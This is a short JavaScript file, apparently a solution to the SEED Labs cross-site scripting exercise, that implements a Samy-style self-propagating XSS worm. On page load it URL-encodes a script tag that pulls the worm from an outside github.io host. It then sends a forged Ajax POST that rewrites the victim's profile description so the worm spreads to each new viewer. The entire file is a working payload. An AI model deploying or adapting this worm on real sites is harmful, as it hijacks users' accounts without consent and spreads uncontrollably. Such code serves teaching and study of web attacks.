// The worm code that will be injected into the victim's profile
window.onload = function() {
    // Define the worm code that will be injected
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" id=\"worm\" " +
        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" +
        "</" + "script>"
    );

    // Construct the description field for the victim's profile
    var desc = "&description=Samy is my hero " + wormCode;
    desc += "&accesslevel[description]=2";  // Set description access level

    // URL for sending the profile modification request
    var sendurl = "http://www.seed-server.com/action/profile/edit";  // Update with correct URL

    // Create and send the Ajax POST request to modify the victim's profile
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(desc);  // Send the modified description with the worm

    // Optional: Notify that the worm has updated the profile
    console.log("Worm successfully injected and profile updated!");
};
